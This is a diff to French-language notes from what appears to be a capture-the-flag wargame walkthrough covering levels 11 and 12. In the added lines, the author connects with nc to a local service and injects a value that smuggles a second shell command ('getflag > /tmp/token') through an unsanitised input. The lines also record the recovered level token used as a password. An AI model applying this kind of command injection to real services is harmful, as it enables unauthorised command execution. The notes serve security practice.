@@ -185,14 +185,31 @@ f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 donne
 
 f05d1d066fb246efe0c6f7d095f909a7a0cf34a0:NotSoEasy
 
-sauf que le hash est reverse donc 
+sauf que c'est pas le bon mot de passe
 
-echo "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" | rev 
+donc on va juste voir que le fonction hash accept un input venant de l'utilisateur.
+On peut modifier la requete. donc avec 
+```
+nc localhost 5151
+```
+puis `  "; getflag > /tmp/token"` 
+on peut apres recuperer le token dans /tmp/token
 
-on doit crack 
-```
-0a43fc0a7a909f590d7f6c0efe642bf660d1d50f
-```
+fa6v5ateaw21peobuub8ipe6s
+
+# level 12
+
+
+su level12:fa6v5ateaw21peobuub8ipe6s
+
+
+le fichier perl 
+un serveur prend deux argument un x un y 
+l'argument x est uppercase puis suprimme si il y a un espace
+puis ensuite on fait un egrep "^x" /tmp/xd
+
+donc l'argument x doit match le contenu du fichier /tmp/xd
+
 
 
 
